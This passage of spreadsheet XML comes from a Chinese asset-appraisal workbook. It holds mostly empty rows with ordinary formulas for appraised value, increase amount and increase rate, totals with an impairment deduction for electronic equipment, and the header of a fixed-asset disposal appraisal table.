        <v/>
      </c>
      <c r="Q9" s="555">
        <f>O9-L9</f>
        <v/>
      </c>
      <c r="R9" s="555">
        <f>IF(L9=0,"",ROUND(Q9/L9*100,2))</f>
        <v/>
      </c>
      <c r="S9" s="211" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="380" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="381" t="n"/>
      <c r="F10" s="381" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="380" t="n"/>
      <c r="I10" s="587" t="n"/>
      <c r="J10" s="587" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="555" t="n"/>
      <c r="N10" s="380" t="n"/>
      <c r="O10" s="555">
        <f>ROUND(M10*N10/100,-2)</f>
        <v/>
      </c>
      <c r="P10" s="555">
        <f>M10-K10</f>
        <v/>
      </c>
      <c r="Q10" s="555">
        <f>O10-L10</f>
        <v/>
      </c>
      <c r="R10" s="555">
        <f>IF(L10=0,"",ROUND(Q10/L10*100,2))</f>
        <v/>
      </c>
      <c r="S10" s="211" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="380" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="381" t="n"/>
      <c r="F11" s="381" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="380" t="n"/>
      <c r="I11" s="587" t="n"/>
      <c r="J11" s="587" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="555" t="n"/>
      <c r="N11" s="380" t="n"/>
      <c r="O11" s="555">
        <f>ROUND(M11*N11/100,-2)</f>
        <v/>
      </c>
      <c r="P11" s="555">
        <f>M11-K11</f>
        <v/>
      </c>
      <c r="Q11" s="555">
        <f>O11-L11</f>
        <v/>
      </c>
      <c r="R11" s="555">
        <f>IF(L11=0,"",ROUND(Q11/L11*100,2))</f>
        <v/>
      </c>
      <c r="S11" s="211" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="380" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="381" t="n"/>
      <c r="F12" s="381" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="380" t="n"/>
      <c r="I12" s="587" t="n"/>
      <c r="J12" s="587" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="555" t="n"/>
      <c r="N12" s="380" t="n"/>
      <c r="O12" s="555">
        <f>ROUND(M12*N12/100,-2)</f>
        <v/>
      </c>
      <c r="P12" s="555">
        <f>M12-K12</f>
        <v/>
      </c>
      <c r="Q12" s="555">
        <f>O12-L12</f>
        <v/>
      </c>
      <c r="R12" s="555">
        <f>IF(L12=0,"",ROUND(Q12/L12*100,2))</f>
        <v/>
      </c>
      <c r="S12" s="211" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="380" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="381" t="n"/>
      <c r="F13" s="381" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="380" t="n"/>
      <c r="I13" s="587" t="n"/>
      <c r="J13" s="587" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="555" t="n"/>
      <c r="N13" s="380" t="n"/>
      <c r="O13" s="555">
        <f>ROUND(M13*N13/100,-2)</f>
        <v/>
      </c>
      <c r="P13" s="555">
        <f>M13-K13</f>
        <v/>
      </c>
      <c r="Q13" s="555">
        <f>O13-L13</f>
        <v/>
      </c>
      <c r="R13" s="555">
        <f>IF(L13=0,"",ROUND(Q13/L13*100,2))</f>
        <v/>
      </c>
      <c r="S13" s="211" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="380" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="381" t="n"/>
      <c r="F14" s="381" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="380" t="n"/>
      <c r="I14" s="587" t="n"/>
      <c r="J14" s="587" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="555" t="n"/>
      <c r="N14" s="380" t="n"/>
      <c r="O14" s="555">
        <f>ROUND(M14*N14/100,-2)</f>
        <v/>
      </c>
      <c r="P14" s="555">
        <f>M14-K14</f>
        <v/>
      </c>
      <c r="Q14" s="555">
        <f>O14-L14</f>
        <v/>
      </c>
      <c r="R14" s="555">
        <f>IF(L14=0,"",ROUND(Q14/L14*100,2))</f>
        <v/>
      </c>
      <c r="S14" s="211" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="380" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="381" t="n"/>
      <c r="F15" s="381" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="380" t="n"/>
      <c r="I15" s="587" t="n"/>
      <c r="J15" s="587" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="555" t="n"/>
      <c r="N15" s="380" t="n"/>
      <c r="O15" s="555">
        <f>ROUND(M15*N15/100,-2)</f>
        <v/>
      </c>
      <c r="P15" s="555">
        <f>M15-K15</f>
        <v/>
      </c>
      <c r="Q15" s="555">
        <f>O15-L15</f>
        <v/>
      </c>
      <c r="R15" s="555">
        <f>IF(L15=0,"",ROUND(Q15/L15*100,2))</f>
        <v/>
      </c>
      <c r="S15" s="211" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="380" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="381" t="n"/>
      <c r="F16" s="381" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="380" t="n"/>
      <c r="I16" s="587" t="n"/>
      <c r="J16" s="587" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="555" t="n"/>
      <c r="N16" s="380" t="n"/>
      <c r="O16" s="555">
        <f>ROUND(M16*N16/100,-2)</f>
        <v/>
      </c>
      <c r="P16" s="555">
        <f>M16-K16</f>
        <v/>
      </c>
      <c r="Q16" s="555">
        <f>O16-L16</f>
        <v/>
      </c>
      <c r="R16" s="555">
        <f>IF(L16=0,"",ROUND(Q16/L16*100,2))</f>
        <v/>
      </c>
      <c r="S16" s="211" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="380" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="381" t="n"/>
      <c r="F17" s="381" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="380" t="n"/>
      <c r="I17" s="587" t="n"/>
      <c r="J17" s="587" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="555" t="n"/>
      <c r="N17" s="380" t="n"/>
      <c r="O17" s="555">
        <f>ROUND(M17*N17/100,-2)</f>
        <v/>
      </c>
      <c r="P17" s="555">
        <f>M17-K17</f>
        <v/>
      </c>
      <c r="Q17" s="555">
        <f>O17-L17</f>
        <v/>
      </c>
      <c r="R17" s="555">
        <f>IF(L17=0,"",ROUND(Q17/L17*100,2))</f>
        <v/>
      </c>
      <c r="S17" s="211" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="380" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="381" t="n"/>
      <c r="F18" s="381" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="380" t="n"/>
      <c r="I18" s="587" t="n"/>
      <c r="J18" s="587" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="555" t="n"/>
      <c r="N18" s="380" t="n"/>
      <c r="O18" s="555">
        <f>ROUND(M18*N18/100,-2)</f>
        <v/>
      </c>
      <c r="P18" s="555">
        <f>M18-K18</f>
        <v/>
      </c>
      <c r="Q18" s="555">
        <f>O18-L18</f>
        <v/>
      </c>
      <c r="R18" s="555">
        <f>IF(L18=0,"",ROUND(Q18/L18*100,2))</f>
        <v/>
      </c>
      <c r="S18" s="211" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="380" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="381" t="n"/>
      <c r="F19" s="381" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="380" t="n"/>
      <c r="I19" s="587" t="n"/>
      <c r="J19" s="587" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="555" t="n"/>
      <c r="N19" s="380" t="n"/>
      <c r="O19" s="555">
        <f>ROUND(M19*N19/100,-2)</f>
        <v/>
      </c>
      <c r="P19" s="555">
        <f>M19-K19</f>
        <v/>
      </c>
      <c r="Q19" s="555">
        <f>O19-L19</f>
        <v/>
      </c>
      <c r="R19" s="555">
        <f>IF(L19=0,"",ROUND(Q19/L19*100,2))</f>
        <v/>
      </c>
      <c r="S19" s="211" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="380" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="381" t="n"/>
      <c r="F20" s="381" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="380" t="n"/>
      <c r="I20" s="587" t="n"/>
      <c r="J20" s="587" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="555" t="n"/>
      <c r="N20" s="380" t="n"/>
      <c r="O20" s="555">
        <f>ROUND(M20*N20/100,-2)</f>
        <v/>
      </c>
      <c r="P20" s="555">
        <f>M20-K20</f>
        <v/>
      </c>
      <c r="Q20" s="555">
        <f>O20-L20</f>
        <v/>
      </c>
      <c r="R20" s="555">
        <f>IF(L20=0,"",ROUND(Q20/L20*100,2))</f>
        <v/>
      </c>
      <c r="S20" s="211" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="380" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="381" t="n"/>
      <c r="F21" s="381" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="380" t="n"/>
      <c r="I21" s="587" t="n"/>
      <c r="J21" s="587" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="555" t="n"/>
      <c r="N21" s="380" t="n"/>
      <c r="O21" s="555">
        <f>ROUND(M21*N21/100,-2)</f>
        <v/>
      </c>
      <c r="P21" s="555">
        <f>M21-K21</f>
        <v/>
      </c>
      <c r="Q21" s="555">
        <f>O21-L21</f>
        <v/>
      </c>
      <c r="R21" s="555">
        <f>IF(L21=0,"",ROUND(Q21/L21*100,2))</f>
        <v/>
      </c>
      <c r="S21" s="211" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="380" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="381" t="n"/>
      <c r="F22" s="381" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="380" t="n"/>
      <c r="I22" s="587" t="n"/>
      <c r="J22" s="587" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="555" t="n"/>
      <c r="N22" s="380" t="n"/>
      <c r="O22" s="555">
        <f>ROUND(M22*N22/100,-2)</f>
        <v/>
      </c>
      <c r="P22" s="555">
        <f>M22-K22</f>
        <v/>
      </c>
      <c r="Q22" s="555">
        <f>O22-L22</f>
        <v/>
      </c>
      <c r="R22" s="555">
        <f>IF(L22=0,"",ROUND(Q22/L22*100,2))</f>
        <v/>
      </c>
      <c r="S22" s="211" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="380" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="381" t="n"/>
      <c r="F23" s="381" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="380" t="n"/>
      <c r="I23" s="587" t="n"/>
      <c r="J23" s="587" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="555" t="n"/>
      <c r="N23" s="380" t="n"/>
      <c r="O23" s="555">
        <f>ROUND(M23*N23/100,-2)</f>
        <v/>
      </c>
      <c r="P23" s="555">
        <f>M23-K23</f>
        <v/>
      </c>
      <c r="Q23" s="555">
        <f>O23-L23</f>
        <v/>
      </c>
      <c r="R23" s="555">
        <f>IF(L23=0,"",ROUND(Q23/L23*100,2))</f>
        <v/>
      </c>
      <c r="S23" s="211" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="380" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="381" t="n"/>
      <c r="F24" s="381" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="380" t="n"/>
      <c r="I24" s="587" t="n"/>
      <c r="J24" s="587" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="555" t="n"/>
      <c r="N24" s="380" t="n"/>
      <c r="O24" s="555">
        <f>ROUND(M24*N24/100,-2)</f>
        <v/>
      </c>
      <c r="P24" s="555">
        <f>M24-K24</f>
        <v/>
      </c>
      <c r="Q24" s="555">
        <f>O24-L24</f>
        <v/>
      </c>
      <c r="R24" s="555">
        <f>IF(L24=0,"",ROUND(Q24/L24*100,2))</f>
        <v/>
      </c>
      <c r="S24" s="211" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="380" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="381" t="n"/>
      <c r="F25" s="381" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="380" t="n"/>
      <c r="I25" s="587" t="n"/>
      <c r="J25" s="587" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="555" t="n"/>
      <c r="N25" s="380" t="n"/>
      <c r="O25" s="555">
        <f>ROUND(M25*N25/100,-2)</f>
        <v/>
      </c>
      <c r="P25" s="555">
        <f>M25-K25</f>
        <v/>
      </c>
      <c r="Q25" s="555">
        <f>O25-L25</f>
        <v/>
      </c>
      <c r="R25" s="555">
        <f>IF(L25=0,"",ROUND(Q25/L25*100,2))</f>
        <v/>
      </c>
      <c r="S25" s="211" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="380" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="381" t="n"/>
      <c r="F26" s="381" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="380" t="n"/>
      <c r="I26" s="587" t="n"/>
      <c r="J26" s="587" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555" t="n"/>
      <c r="M26" s="555" t="n"/>
      <c r="N26" s="380" t="n"/>
      <c r="O26" s="555">
        <f>ROUND(M26*N26/100,-2)</f>
        <v/>
      </c>
      <c r="P26" s="555">
        <f>M26-K26</f>
        <v/>
      </c>
      <c r="Q26" s="555">
        <f>O26-L26</f>
        <v/>
      </c>
      <c r="R26" s="555">
        <f>IF(L26=0,"",ROUND(Q26/L26*100,2))</f>
        <v/>
      </c>
      <c r="S26" s="211" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="380" t="n"/>
      <c r="D27" s="381" t="n"/>
      <c r="E27" s="381" t="n"/>
      <c r="F27" s="381" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="380" t="n"/>
      <c r="I27" s="587" t="n"/>
      <c r="J27" s="587" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555" t="n"/>
      <c r="M27" s="555" t="n"/>
      <c r="N27" s="380" t="n"/>
      <c r="O27" s="555">
        <f>ROUND(M27*N27/100,-2)</f>
        <v/>
      </c>
      <c r="P27" s="555">
        <f>M27-K27</f>
        <v/>
      </c>
      <c r="Q27" s="555">
        <f>O27-L27</f>
        <v/>
      </c>
      <c r="R27" s="555">
        <f>IF(L27=0,"",ROUND(Q27/L27*100,2))</f>
        <v/>
      </c>
      <c r="S27" s="211" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="380" t="n"/>
      <c r="D28" s="381" t="n"/>
      <c r="E28" s="381" t="n"/>
      <c r="F28" s="381" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="587" t="n"/>
      <c r="J28" s="587" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555" t="n"/>
      <c r="M28" s="555" t="n"/>
      <c r="N28" s="380" t="n"/>
      <c r="O28" s="555">
        <f>ROUND(M28*N28/100,-2)</f>
        <v/>
      </c>
      <c r="P28" s="555">
        <f>M28-K28</f>
        <v/>
      </c>
      <c r="Q28" s="555">
        <f>O28-L28</f>
        <v/>
      </c>
      <c r="R28" s="555">
        <f>IF(L28=0,"",ROUND(Q28/L28*100,2))</f>
        <v/>
      </c>
      <c r="S28" s="211" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="380" t="n"/>
      <c r="D29" s="381" t="n"/>
      <c r="E29" s="381" t="n"/>
      <c r="F29" s="381" t="n"/>
      <c r="G29" s="380" t="n"/>
      <c r="H29" s="380" t="n"/>
      <c r="I29" s="587" t="n"/>
      <c r="J29" s="587" t="n"/>
      <c r="K29" s="555" t="n"/>
      <c r="L29" s="555" t="n"/>
      <c r="M29" s="555" t="n"/>
      <c r="N29" s="380" t="n"/>
      <c r="O29" s="555">
        <f>ROUND(M29*N29/100,-2)</f>
        <v/>
      </c>
      <c r="P29" s="555">
        <f>M29-K29</f>
        <v/>
      </c>
      <c r="Q29" s="555">
        <f>O29-L29</f>
        <v/>
      </c>
      <c r="R29" s="555">
        <f>IF(L29=0,"",ROUND(Q29/L29*100,2))</f>
        <v/>
      </c>
      <c r="S29" s="211" t="n"/>
    </row>
    <row r="30" ht="16.5" customHeight="1" s="415">
      <c r="A30" s="116" t="n"/>
      <c r="B30" s="380" t="n"/>
      <c r="C30" s="380" t="n"/>
      <c r="D30" s="381" t="n"/>
      <c r="E30" s="381" t="n"/>
      <c r="F30" s="381" t="n"/>
      <c r="G30" s="380" t="n"/>
      <c r="H30" s="380" t="n"/>
      <c r="I30" s="587" t="n"/>
      <c r="J30" s="587" t="n"/>
      <c r="K30" s="555" t="n"/>
      <c r="L30" s="555" t="n"/>
      <c r="M30" s="555" t="n"/>
      <c r="N30" s="380" t="n"/>
      <c r="O30" s="555">
        <f>ROUND(M30*N30/100,-2)</f>
        <v/>
      </c>
      <c r="P30" s="555">
        <f>M30-K30</f>
        <v/>
      </c>
      <c r="Q30" s="555">
        <f>O30-L30</f>
        <v/>
      </c>
      <c r="R30" s="555">
        <f>IF(L30=0,"",ROUND(Q30/L30*100,2))</f>
        <v/>
      </c>
      <c r="S30" s="211" t="n"/>
    </row>
    <row r="31" ht="16.5" customHeight="1" s="415">
      <c r="A31" s="116" t="n"/>
      <c r="B31" s="380" t="n"/>
      <c r="C31" s="380" t="n"/>
      <c r="D31" s="381" t="n"/>
      <c r="E31" s="381" t="n"/>
      <c r="F31" s="381" t="n"/>
      <c r="G31" s="380" t="n"/>
      <c r="H31" s="380" t="n"/>
      <c r="I31" s="587" t="n"/>
      <c r="J31" s="587" t="n"/>
      <c r="K31" s="555" t="n"/>
      <c r="L31" s="555" t="n"/>
      <c r="M31" s="555" t="n"/>
      <c r="N31" s="380" t="n"/>
      <c r="O31" s="555">
        <f>ROUND(M31*N31/100,-2)</f>
        <v/>
      </c>
      <c r="P31" s="555">
        <f>M31-K31</f>
        <v/>
      </c>
      <c r="Q31" s="555">
        <f>O31-L31</f>
        <v/>
      </c>
      <c r="R31" s="555">
        <f>IF(L31=0,"",ROUND(Q31/L31*100,2))</f>
        <v/>
      </c>
      <c r="S31" s="211" t="n"/>
    </row>
    <row r="32" ht="16.5" customHeight="1" s="415">
      <c r="A32" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B32" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C32" s="593" t="n"/>
      <c r="D32" s="567" t="n"/>
      <c r="E32" s="380" t="n"/>
      <c r="F32" s="115" t="n"/>
      <c r="G32" s="115" t="n"/>
      <c r="H32" s="608">
        <f>SUM(H7:H31)</f>
        <v/>
      </c>
      <c r="I32" s="565" t="n"/>
      <c r="J32" s="565" t="n"/>
      <c r="K32" s="555">
        <f>SUM(K7:K31)</f>
        <v/>
      </c>
      <c r="L32" s="555">
        <f>SUM(L7:L31)</f>
        <v/>
      </c>
      <c r="M32" s="555">
        <f>SUM(M7:M31)</f>
        <v/>
      </c>
      <c r="N32" s="380" t="n"/>
      <c r="O32" s="555">
        <f>SUM(O7:O31)</f>
        <v/>
      </c>
      <c r="P32" s="555">
        <f>M32-K32</f>
        <v/>
      </c>
      <c r="Q32" s="555">
        <f>O32-L32</f>
        <v/>
      </c>
      <c r="R32" s="555">
        <f>IF(L32=0,"",ROUND(Q32/L32*100,2))</f>
        <v/>
      </c>
      <c r="S32" s="213" t="n"/>
    </row>
    <row r="33" ht="16.5" customHeight="1" s="415">
      <c r="A33" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B33" s="284" t="inlineStr">
        <is>
          <t>减：电子设备减值准备</t>
        </is>
      </c>
      <c r="C33" s="593" t="n"/>
      <c r="D33" s="567" t="n"/>
      <c r="E33" s="565" t="n"/>
      <c r="F33" s="565" t="n"/>
      <c r="G33" s="565" t="n"/>
      <c r="H33" s="565" t="n"/>
      <c r="I33" s="565" t="n"/>
      <c r="J33" s="565" t="n"/>
      <c r="K33" s="555" t="n"/>
      <c r="L33" s="555" t="n"/>
      <c r="M33" s="555" t="n"/>
      <c r="N33" s="380" t="n"/>
      <c r="O33" s="555" t="n"/>
      <c r="P33" s="555">
        <f>M33-K33</f>
        <v/>
      </c>
      <c r="Q33" s="555">
        <f>O33-L33</f>
        <v/>
      </c>
      <c r="R33" s="555">
        <f>IF(L33=0,"",ROUND(Q33/L33*100,2))</f>
        <v/>
      </c>
      <c r="S33" s="211" t="n"/>
    </row>
    <row r="34" ht="16.5" customHeight="1" s="415">
      <c r="A34" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B34" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C34" s="593" t="n"/>
      <c r="D34" s="567" t="n"/>
      <c r="E34" s="380" t="n"/>
      <c r="F34" s="115" t="n"/>
      <c r="G34" s="115" t="n"/>
      <c r="H34" s="608">
        <f>H32-H33</f>
        <v/>
      </c>
      <c r="I34" s="565" t="n"/>
      <c r="J34" s="565" t="n"/>
      <c r="K34" s="555">
        <f>K32-K33</f>
        <v/>
      </c>
      <c r="L34" s="555">
        <f>L32-L33</f>
        <v/>
      </c>
      <c r="M34" s="555">
        <f>M32-M33</f>
        <v/>
      </c>
      <c r="N34" s="380" t="n"/>
      <c r="O34" s="555">
        <f>O32-O33</f>
        <v/>
      </c>
      <c r="P34" s="555">
        <f>M34-K34</f>
        <v/>
      </c>
      <c r="Q34" s="555">
        <f>O34-L34</f>
        <v/>
      </c>
      <c r="R34" s="555">
        <f>IF(L34=0,"",ROUND(Q34/L34*100,2))</f>
        <v/>
      </c>
      <c r="S34" s="213" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="20">
    <mergeCell ref="B4:F4"/>
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="B2:S2"/>
    <mergeCell ref="K5:L5"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="B1:S1"/>
    <mergeCell ref="B34:D34"/>
    <mergeCell ref="I5:I6"/>
    <mergeCell ref="B33:D33"/>
    <mergeCell ref="G5:G6"/>
    <mergeCell ref="S5:S6"/>
    <mergeCell ref="B32:D32"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="H5:H6"/>
    <mergeCell ref="R5:R6"/>
    <mergeCell ref="J5:J6"/>
    <mergeCell ref="M5:O5"/>
    <mergeCell ref="P5:Q5"/>
    <mergeCell ref="C5:C6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:S34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6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 codeName="Sheet62">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N34"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="H7" sqref="H7:H29"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="27" customWidth="1" style="410" min="3" max="3"/>
    <col width="15.3333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="5" max="6"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="9" max="10"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col width="22.6666666666667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固定资产清理评估明细表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  <c r="M2" s="376" t="n"/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7" t="n"/>
      <c r="L3" s="548" t="inlineStr">
        <is>
          <t>表4-8-7</t>
        </is>
      </c>
      <c r="M3" s="376" t="n"/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376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="M4" s="376" t="n"/>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="369">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头1</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>待处理资产名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="567" t="n"/>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="H5" s="593" t="n"/>
      <c r="I5" s="567" t="n"/>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
      <c r="M5" s="344" t="n"/>
      <c r="N5" s="154" t="n"/>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="inlineStr">
        <is>
          <t>检索表头2</t>
        </is>
      </c>
      <c r="B6" s="594" t="n"/>
      <c r="C6" s="594" t="n"/>
      <c r="D6" s="594" t="n"/>
      <c r="E6" s="307" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="F6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="G6" s="380" t="inlineStr">
        <is>
